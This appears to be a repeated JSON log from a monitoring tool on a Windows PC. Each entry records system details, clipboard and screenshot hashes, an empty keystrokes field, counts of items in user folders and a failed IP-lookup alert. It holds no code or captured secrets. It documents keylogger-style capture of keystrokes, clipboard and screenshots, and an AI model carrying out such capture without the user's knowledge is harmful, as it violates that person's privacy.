{"timestamp": "2025-06-14T08:05:27.956915+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ef79b8725b041d91271efed4a26d8a0a7ca6ef24e9645620bceab7d96c843b1a", "_raw_log_hash": "93743ef0779ab1ca15314715103fc030b8f7873ef9ce186205061a6cac23d31b"}
{"timestamp": "2025-06-14T08:05:41.436227+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "64ea262ff12817d702e6afc2c9db8b05ca45453ed053d2a18bbfc597b81685a2", "_raw_log_hash": "c0d5b6eb3e3b06bb86cdf909a7af2e12c24918d0e02b193985e0b9aae049ffe6"}
{"timestamp": "2025-06-14T08:05:54.966599+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5270d94c427f7af7a768ebfbca2115b32b919b2dc9fa8eaf39edbc04d829cfdb", "_raw_log_hash": "ca302488c148c54892466b56e712567e69dd86b8b75e7c9ae7221ab8a5a1884d"}
{"timestamp": "2025-06-14T08:06:08.952758+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7b3cee5f54bceb192f3e29ecb6d315d4c2cb11e455ea147b0622ff89213a30aa", "_raw_log_hash": "7efb2d44395fc112039fd483c3266457f3c40df5ffd5bd0db00639a0d88472fe"}
{"timestamp": "2025-06-14T08:06:22.531437+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6a6fb73946f5dd6579d6aa3951e0fe51b6ecae719002857a34766f6768638324", "_raw_log_hash": "6fb306dd4c0318d4a9dcdbf5d22bf9c449245951a7c97ae0703df0a0e31f6957"}
{"timestamp": "2025-06-14T08:06:36.115896+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9d97e896d6cff37a698b6afe34ea828f98ed57d3963f18b6b44dd78ca07e3fb7", "_raw_log_hash": "446582bb7e8f839d7fd4b617a3dec7e65835da27c9393f9f0cb63f4f3def5c29"}
{"timestamp": "2025-06-14T08:06:49.701524+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4bfc67af44d16fd7dad25f1fe3038b1600ec98df69b54c9edfe13b1440517363", "_raw_log_hash": "76aba4fc710244542b311311d60b0d9d26b522046f99caaca5dab811965e7135"}
{"timestamp": "2025-06-14T08:07:03.251450+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "aefa8201e3426cdd3ef2bc74856915886a5703b92c99d91850f2c06dd396aac5", "_raw_log_hash": "b21cfc774cb849218544e26e244fd2e207221faf53bfc35d5d3f9132e99c8468"}
{"timestamp": "2025-06-14T08:07:16.815791+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "debf6bf432e4d9750e4f0dc6ae4cec38a52858b1ef25f8c8690b9c93efc090bb", "_raw_log_hash": "0225788a8ac3b1dabcf7e2e412319aac4c69f43afd698994fb96d09280aabae4"}
{"timestamp": "2025-06-14T08:07:30.331101+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "07eeb15764eae59ab86b14a631e98a2e271fa81ed2f34c6676795718401a587f", "_raw_log_hash": "be422778f6085302296c7fb6ebfe88cbe1e1e24c9b5047f04dacce747c2cccda"}
{"timestamp": "2025-06-14T08:07:43.961428+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2a8d47e76bc9186e07188ce475c3c9ca5f89a09527fd839a248a2f5eaf32c9e7", "_raw_log_hash": "b40240c52f8c39fc67b6b72b4c4bca52256c1ea659fe77c52fff8148fcfb124b"}
{"timestamp": "2025-06-14T08:07:57.585489+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "358b5b262d2e46c4a33e5b9292d563427e1fdf5bdc2d1616eeb0f6a7a07b343f", "_raw_log_hash": "489cecdc930f8c5e5dcb84ed8d72169298e711f90871e7904ec3ceb8e2643a1a"}
{"timestamp": "2025-06-14T08:08:11.133889+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2d84b2e080ecd49652b6ba9823392d5b5226a87b60a25a0baec0e10e04af6975", "_raw_log_hash": "fecf627f98042e02a81ae06291e4856fbd0c26f45d9409813461de46c5bb0a9b"}
{"timestamp": "2025-06-14T08:08:24.783365+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "87c7e7966d453c6e2bb5b4dc95bee7d3e69117d852087c3ee3dca85c0374501f", "_raw_log_hash": "7f57b0497e42d45f0d680d33464ad01ee4f47e6d1f03e1f88cb0b57ec755e6f7"}
{"timestamp": "2025-06-14T08:08:38.336661+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d87d9c913d538e71e553f7a636d18d3984e8b8a5fd2c5654bc98957ce35e7c50", "_raw_log_hash": "942777c32a5a61dfbd2a6e290ef4927aa6cc966757b83b3a1ff245dd88b5cf07"}
{"timestamp": "2025-06-14T08:08:51.928177+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "18ced07d13ac15833e9f1f7160c731a55d0e4f3bca96e84153e882b46cf6e0c1", "_raw_log_hash": "33598168af931cf68f73bbcf18eb6842a366fe5f9182677b41076bfa65cef368"}
{"timestamp": "2025-06-14T08:09:05.594387+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "167635e77b1fc0321f674bbe51a7f56f780080755f84fd3fa2ccfb8549df075a", "_raw_log_hash": "0544efd7bbfa4bbc8e30c19be82651514b441fd8af67c75596efbf88dc8f229d"}
{"timestamp": "2025-06-14T08:09:19.087023+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8a684fa1daf9d99935744f44a353c826f9388931a3174d43c4e7cd503942fd8a", "_raw_log_hash": "6f99923069e15e594c818b69160f36f9934a8deae1bcc12f06b01dbfb11dac6d"}
{"timestamp": "2025-06-14T08:09:32.689506+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "60eac8a04fd123e992b5dedef5cc23fa329f0fcd9431b2ab380dbeda1b20bb62", "_raw_log_hash": "98bb7fdfb4271f52acf48187e0787b07db3236555717e27f58989f443826f17e"}
{"timestamp": "2025-06-14T08:09:46.200908+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bf205ab252823aa02a26645dd2386e3a900b941bbc9b2f6eba2868265fb90f25", "_raw_log_hash": "f4ec0e3810eed332b3884473878f00795638b9b42cea9d3aa75a81f90283040d"}
{"timestamp": "2025-06-14T08:09:59.788925+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0c0d6407c1f7796c30dcb8cb6db646a7e40938453325bcff53e25338ca164f2b", "_raw_log_hash": "245b60ca3a60aeabc7109b94090f42ea989108947e6826de6375a29497ed840d"}
{"timestamp": "2025-06-14T08:10:13.332296+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8a434ed1573bb4c14ca4b2e2c1dd56bd4ec2ab2a92fbdaa38ade834d5547dae9", "_raw_log_hash": "bab96837df549b2377382d4af37bb9d70d63c86969ad7585275e1d6d6584adb4"}
{"timestamp": "2025-06-14T08:10:26.906690+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e38c93ddcab8c53423706cf21fa662a11d1e802018fec0b5a9aefab10466af29", "_raw_log_hash": "125953a0ce9d8af96fbe6b2bc0bcd0aa7f08000f161b75d3c0ac3493861307f2"}
{"timestamp": "2025-06-14T08:10:40.605346+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3aa7356965e621fb313333313483b8e4f28e53fa675309efd6efdf397025f90f", "_raw_log_hash": "24af04ff3c6f0f67ff55576a03696e4d26c3ea7813399823a608392ee62ef91f"}
{"timestamp": "2025-06-14T08:10:54.208712+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e65e59f0b52dc8bd86a9dab88b05647a4b7ba50870a10c7cec9d1422cfcd65f8", "_raw_log_hash": "138b47fce9eb4bfcd8312402439a2409be86a45bf0c9a84fb1864d058dd4e823"}
{"timestamp": "2025-06-14T08:11:07.750334+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c83c82f1e43cb471503235bb5b5923112dac1203efa8e0c8557e8e1ebbe05c9d", "_raw_log_hash": "21461c0b5a1ccdd5d283c36b8303241be6aae2a0bb1dfb77d7b726c113f9872c"}
